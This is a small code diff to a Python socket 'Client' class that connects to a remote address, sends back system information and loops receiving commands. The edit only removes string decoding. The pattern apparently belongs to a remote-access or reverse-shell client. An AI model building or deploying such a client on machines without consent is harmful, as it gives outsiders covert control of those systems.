@@ -67,14 +67,14 @@ class Client(StreamSocket):
             utils.throw(f"Could not establish connection with {self.Address}")
 
         try:
-            establish_msg = self.receive(sock).decode()
+            establish_msg = self.receive(sock)
             utils.status(establish_msg)
 
             sysinfo = self.sys_info()
             self.send(sock, sysinfo)
 
             while True:
-                command = self.receive(sock).decode()
+                command = self.receive(sock)
 
                 if self.Verbose:
                     utils.status(command)
